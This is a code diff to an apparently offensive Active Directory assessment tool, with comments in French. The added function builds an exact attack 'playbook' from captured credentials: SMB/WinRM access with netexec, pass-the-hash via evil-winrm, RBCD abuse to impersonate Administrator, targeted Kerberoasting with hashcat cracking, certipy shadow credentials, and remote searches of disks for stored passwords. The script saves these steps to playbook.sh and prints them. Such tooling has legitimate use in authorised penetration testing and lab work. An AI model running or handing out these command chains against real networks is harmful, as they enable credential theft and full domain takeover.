@@ -2051,6 +2051,57 @@ SEV_ORDER = {"CRIT": 0, "HIGH": 1, "MED": 2, "INFO": 3}
 # ======================================================================
 SEV_ORDER = {"CRIT": 0, "HIGH": 1, "MED": 2, "INFO": 3}
 
+def build_playbook(state, args):
+    """Genere les COMMANDES exactes a executer selon ce que l'outil a trouve
+    (ce qu'il n'a pas pu faire lui-meme : outil absent ou etape manuelle/RDP).
+    Un scanner ne fait pas tout -> on propose le coup d'apres, pret a copier."""
+    dom = state.get("domain") or "<domaine>"
+    hosts = state.get("hosts", {})
+    dc = first_dc(hosts) or "<dc-ip>"
+    dc_fqdn = next((r.get("dns_hostname") for r in hosts.values()
+                    if r.get("is_dc") and r.get("dns_hostname")), dc)
+    owned = {}
+    for c in state.get("creds", []):
+        if c.get("user"):
+            owned.setdefault(c["user"].lower(), c)
+    idf = lambda c: f"-H {c['hash']}" if c.get("hash") else f"-p '{c.get('password')}'"
+    pb = []
+    # 1) acces avec chaque cred obtenu
+    for c in state.get("creds", []):
+        pb.append(f"# --- Acces {c['user']} ---")
+        pb.append(f"nxc smb {dc} -u '{c['user']}' {idf(c)} -d {dom} --shares")
+        pb.append(f"nxc winrm {dc} -u '{c['user']}' {idf(c)} -d {dom}   # WinRM ? -> evil-winrm")
+        if c.get("password"):
+            pb.append(f"xfreerdp /v:{dc} /u:'{c['user']}' /p:'{c['password']}' /cert:ignore   # RDP")
+    # 2) exploitation des chemins ACL (avec le cred du principal 'from')
+    for p in state.get("acl_paths", []):
+        frm, to, rights = p.get("from", ""), p.get("to", ""), p.get("rights", [])
+        c = owned.get(frm.lower())
+        if not c:
+            pb.append(f"# [ACL] {frm} -> {'/'.join(rights)} -> {to} : obtiens d'abord le cred de {frm}")
+            continue
+        if to.endswith("$"):   # machine -> RBCD
+            pb.append(f"# --- RBCD : {frm} -> {to} ---")
+            pb.append(f"addcomputer.py {dom}/'{frm}':'{c.get('password','')}' -computer-name FAKE01$ -computer-pass Fake123! -dc-ip {dc}")
+            pb.append(f"rbcd.py {dom}/'{frm}':'{c.get('password','')}' -delegate-from FAKE01$ -delegate-to {to} -action write -dc-ip {dc}")
+            pb.append(f"getST.py -spn cifs/{to.rstrip('$')}.{dom} -impersonate Administrator {dom}/FAKE01$:Fake123! -dc-ip {dc}")
+        else:                  # user -> targeted kerberoast (ou shadow creds)
+            pb.append(f"# --- Targeted Kerberoast : {frm} ({'/'.join(rights)}) -> {to} ---")
+            pb.append(f"targetedKerberoast.py -v -d {dom} -u '{frm}' {idf(c)} --dc-host {dc_fqdn} --request-user {to}")
+            pb.append(f"hashcat -m 13100 <hash_{to}> /usr/share/wordlists/rockyou.txt   # -> {to}:<pass>")
+            pb.append(f"# alt (shadow creds, si ADCS) : certipy shadow auto -u '{frm}@{dom}' {idf(c)} -account {to} -dc-ip {dc}")
+    # 3) NTDS dumpe -> Administrator / Golden Ticket
+    if state.get("hashes", {}).get("ntds"):
+        pb.append("# --- Domaine compromis (NTDS) ---")
+        pb.append(f"grep -i 'Administrator:' {state['hashes']['ntds']}")
+        pb.append(f"evil-winrm -i {dc} -u Administrator -H <NThash>")
+    # 4) chasse de creds SUR LE DISQUE (ce qu'un scanner ne fait pas : RDP/WinRM)
+    pb.append("# --- Creds sur le disque (scripts/configs) : via un compte RDP ou WinRM ---")
+    pb.append(f"# WinRM : nxc winrm {dc} -u <user> {idf(next(iter(owned.values()), {'password':'<pass>'}))} "
+              f"-x \"gci C:\\ -recurse -include *.ps1,*.config,*.xml,*.txt -ea 0 | sls -Pattern 'pass|pwd|cred'\"")
+    pb.append(f"# RDP : xfreerdp /v:{dc} /u:<user> /p:<pass> /cert:ignore  ->  dir C:\\Scripts ; type C:\\Scripts\\*.ps1")
+    return pb
+
 def phase5_report(state, args):
     stage("PHASE 5 - RAPPORT")
     out_json = os.path.join(args.loot, "report.json")
@@ -2106,17 +2157,35 @@ def phase5_report(state, args):
             lines.append(f"- {k} : `{v}`  ->  `hashcat -m {m} {v} rockyou.txt`")
         lines.append("")
 
+    # PLAYBOOK : les commandes exactes a executer (ce que l'outil ne peut pas faire seul)
+    pb = build_playbook(state, args)
+    lines.append("## PLAYBOOK (commandes a executer)\n")
+    lines.append("```bash")
+    lines.extend(pb)
+    lines.append("```")
+
     report = "\n".join(lines) + "\n"
     out_md = os.path.join(args.loot, "report.md")
     with open(out_md, "w", encoding="utf-8") as f:
         f.write(report)
-    log(f"{C.G}[+] Rapport : {out_md}  +  {out_json}{C.X}")
+    save_loot(args, "playbook.sh", "#!/bin/bash\n# adhunt - commandes proposees (adapte <...>)\n"
+              + "\n".join(pb) + "\n")
+    log(f"{C.G}[+] Rapport : {out_md}  +  {out_json}  +  playbook.sh{C.X}")
     # apercu console
     ncrit = sum(1 for f in findings if f["sev"] == "CRIT")
     nhigh = sum(1 for f in findings if f["sev"] == "HIGH")
     log(f"{C.CY}{C.BD}[=] {len(findings)} finding(s) : "
         f"{C.R}{ncrit} CRIT{C.CY} / {C.R}{nhigh} HIGH{C.CY} / "
         f"{len(state.get('creds', []))} cred(s){C.X}")
+    # PLAYBOOK a l'ecran (les lignes de commande, pas les commentaires)
+    cmds = [l for l in pb if l and not l.startswith("#")]
+    if cmds:
+        log(f"\n{C.CY}{C.BD}[>] PLAYBOOK - prochaines commandes ({len(cmds)}) -> {args.loot}/playbook.sh :{C.X}")
+        for l in pb[:30]:
+            col = C.GR if l.startswith("#") else C.G
+            log(f"    {col}{l}{C.X}")
+        if len(pb) > 30:
+            log(f"    {C.GR}... (suite dans playbook.sh){C.X}")
 
 def suggest_next(args, state):
     """Propose la commande a lancer a la suite selon l'etat."""
